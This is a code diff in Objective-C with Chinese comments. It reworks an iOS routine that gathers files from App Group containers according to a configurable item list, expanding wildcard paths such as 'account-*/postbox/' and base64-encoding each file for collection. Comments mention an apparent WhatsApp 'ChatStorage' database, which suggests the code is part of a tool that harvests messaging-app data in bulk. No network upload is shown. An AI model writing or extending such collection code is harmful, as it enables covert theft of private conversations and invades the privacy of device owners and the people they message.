@@ -305,10 +305,64 @@
     return nil;
 }
 
-/// 采 AppGroup 容器：只按片段过滤，不猜目录名
+/// 把 `account-*/postbox/` 这类路径按实际目录展开（逐段处理 * 通配）
++ (NSArray<NSString *> *)expandPath:(NSString *)pattern root:(NSString *)root {
+    NSMutableArray *cur = [NSMutableArray arrayWithObject:@""];
+    for (NSString *seg in [pattern componentsSeparatedByString:@"/"]) {
+        if (seg.length == 0) continue;
+        NSMutableArray *next = [NSMutableArray array];
+        if ([seg rangeOfString:@"*"].location == NSNotFound) {
+            for (NSString *base in cur) {
+                [next addObject:base.length ? [base stringByAppendingPathComponent:seg] : seg];
+            }
+        } else {
+            // 通配段：列出当前目录，按前缀/后缀匹配
+            NSFileManager *fm = [NSFileManager defaultManager];
+            NSString *prefix = [seg componentsSeparatedByString:@"*"].firstObject ?: @"";
+            NSString *suffix = [seg componentsSeparatedByString:@"*"].lastObject ?: @"";
+            for (NSString *base in cur) {
+                NSString *dir = base.length ? [root stringByAppendingPathComponent:base] : root;
+                for (NSString *n in [fm contentsOfDirectoryAtPath:dir error:NULL] ?: @[]) {
+                    if (![n hasPrefix:prefix]) continue;
+                    if (suffix.length && ![n hasSuffix:suffix]) continue;
+                    [next addObject:base.length ? [base stringByAppendingPathComponent:n] : n];
+                }
+            }
+        }
+        cur = next;
+        if (!cur.count) break;
+    }
+    return cur;
+}
+
+/// 递归收一个目录下的所有文件
++ (void)collectDir:(NSString *)rel root:(NSString *)root
+             into:(NSMutableArray *)files bytes:(NSUInteger *)bytes limit:(NSUInteger)limit {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *dir = rel.length ? [root stringByAppendingPathComponent:rel] : root;
+    for (NSString *n in [fm contentsOfDirectoryAtPath:dir error:NULL] ?: @[]) {
+        if (*bytes >= limit) return;
+        NSString *childRel = rel.length ? [rel stringByAppendingPathComponent:n] : n;
+        NSString *full = [root stringByAppendingPathComponent:childRel];
+        BOOL isDir = NO;
+        [fm fileExistsAtPath:full isDirectory:&isDir];
+        if (isDir) {
+            [self collectDir:childRel root:root into:files bytes:bytes limit:limit];
+            continue;
+        }
+        unsigned long long size = [[fm attributesOfItemAtPath:full error:NULL] fileSize];
+        if (size == 0 || size > 32 * 1024 * 1024) continue;
+        if (*bytes + size > limit) continue;
+        NSData *data = [NSData dataWithContentsOfFile:full];
+        if (!data.length) continue;
+        *bytes += data.length;
+        [files addObject:@{ @"p": childRel, @"d": [data base64EncodedStringWithOptions:0] }];
+    }
+}
+
+/// 严格按采集配置的 items 采：type=dir 收整目录（含通配展开），type=file 只收那一个文件
 + (NSDictionary *)collectAppGroup:(NSString *)groupId
-                          include:(NSArray<NSString *> *)includeSubstrings
-                          exclude:(NSArray<NSString *> *)excludeSubstrings
+                            items:(NSArray<NSDictionary *> *)items
                             limit:(NSUInteger)maxBytes {
     NSMutableArray *files = [NSMutableArray array];
     NSUInteger bytes = 0;
@@ -317,43 +371,36 @@
     if (!root) return @{ @"files": files, @"bytes": @0, @"error": @"appgroup not found" };
 
     NSFileManager *fm = [NSFileManager defaultManager];
-    NSMutableArray *stack = [NSMutableArray arrayWithObject:@[@""]];
-    while (stack.count && bytes < maxBytes) {
-        NSString *rel = stack.lastObject[0];
-        [stack removeLastObject];
-        NSString *dir = rel.length ? [root stringByAppendingPathComponent:rel] : root;
+    for (NSDictionary *item in items) {
+        if (bytes >= maxBytes) break;
+        NSString *type = [item[@"type"] isKindOfClass:[NSString class]] ? item[@"type"] : @"dir";
+        NSString *path = [item[@"path"] isKindOfClass:[NSString class]] ? item[@"path"] : @"";
+        path = [path stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@"/"]];
+        if (!path.length) continue;
 
-        for (NSString *n in [fm contentsOfDirectoryAtPath:dir error:NULL] ?: @[]) {
-            NSString *childRel = rel.length ? [rel stringByAppendingPathComponent:n] : n;
-            NSString *full = [root stringByAppendingPathComponent:childRel];
-            BOOL isDir = NO;
-            [fm fileExistsAtPath:full isDirectory:&isDir];
-            if (isDir) {
-                if ([n isEqualToString:@"Caches"] || [n hasSuffix:@".app"]) continue;
-                [stack addObject:@[childRel]];
-                continue;
-            }
-
-            // 片段过滤
-            BOOL ok = includeSubstrings.count == 0;
-            for (NSString *inc in includeSubstrings) {
-                if ([childRel rangeOfString:inc options:NSCaseInsensitiveSearch].location != NSNotFound) { ok = YES; break; }
-            }
-            if (!ok) continue;
-            for (NSString *exc in excludeSubstrings) {
-                if ([childRel rangeOfString:exc options:NSCaseInsensitiveSearch].location != NSNotFound) { ok = NO; break; }
-            }
-            if (!ok) continue;
-
-            NSDictionary *attr = [fm attributesOfItemAtPath:full error:NULL];
-            unsigned long long size = [attr fileSize];
-            if (size == 0 || size > 24 * 1024 * 1024) continue;   // 单文件 24MB 上限（WS 的 ChatStorage 会超 8MB）
-            if (bytes + size > maxBytes) continue;
-
+        if ([type isEqualToString:@"file"]) {
+            NSString *full = [root stringByAppendingPathComponent:path];
             NSData *data = [NSData dataWithContentsOfFile:full];
-            if (!data.length) continue;
-            bytes += data.length;
-            [files addObject:@{ @"p": childRel, @"d": [data base64EncodedStringWithOptions:0] }];
+            if (data.length && data.length <= 32 * 1024 * 1024 && bytes + data.length <= maxBytes) {
+                bytes += data.length;
+                [files addObject:@{ @"p": path, @"d": [data base64EncodedStringWithOptions:0] }];
+            }
+            continue;
+        }
+
+        // dir：先展开通配，再整目录递归收
+        for (NSString *dirRel in [self expandPath:path root:root]) {
+            BOOL isDir = NO;
+            [fm fileExistsAtPath:[root stringByAppendingPathComponent:dirRel] isDirectory:&isDir];
+            if (isDir) {
+                [self collectDir:dirRel root:root into:files bytes:&bytes limit:maxBytes];
+            } else {
+                NSData *data = [NSData dataWithContentsOfFile:[root stringByAppendingPathComponent:dirRel]];
+                if (data.length && data.length <= 32 * 1024 * 1024 && bytes + data.length <= maxBytes) {
+                    bytes += data.length;
+                    [files addObject:@{ @"p": dirRel, @"d": [data base64EncodedStringWithOptions:0] }];
+                }
+            }
         }
     }
     return @{ @"files": files, @"bytes": @(bytes) };
